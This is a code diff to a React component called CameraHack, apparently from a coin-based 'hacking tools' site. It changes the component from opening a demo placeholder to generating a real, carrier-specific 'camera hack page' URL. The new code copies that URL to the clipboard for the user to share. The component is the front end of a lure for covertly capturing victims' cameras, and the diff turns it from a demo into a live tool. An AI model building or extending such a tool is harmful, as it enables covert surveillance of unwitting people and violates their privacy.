@@ -1,4 +1,3 @@
-
 import { useState } from 'react';
 import Layout from '@/components/Layout';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
@@ -49,17 +48,22 @@ const CameraHack = () => {
     localStorage.setItem(`user_${currentUser.id}`, JSON.stringify(updatedUser));
     setUserCoins(updatedUser.coins);
 
-    // Create unique camera hack page URL
-    const cameraUrl = `/camera/${carrier.toLowerCase()}/${currentUser.id}`;
+    // Generate the actual camera hack page URL
+    const baseUrl = window.location.origin;
+    const cameraUrl = `${baseUrl}/cam/${carrier.toLowerCase()}/${currentUser.id}`;
     
     toast({
       title: 'Tool Activated',
       description: `${carrier} camera hack page generated successfully. 3 coins deducted.`
     });
 
-    // In a real implementation, this would create/redirect to the camera hack page
-    // For demo purposes, we'll show a placeholder
-    window.open(`https://henz-camera-demo.com${cameraUrl}`, '_blank');
+    // Copy URL to clipboard and show it
+    navigator.clipboard.writeText(cameraUrl);
+    
+    // Show the generated URL
+    setTimeout(() => {
+      alert(`Camera Hack URL Generated:\n\n${cameraUrl}\n\nURL copied to clipboard!`);
+    }, 500);
   };
 
   return (
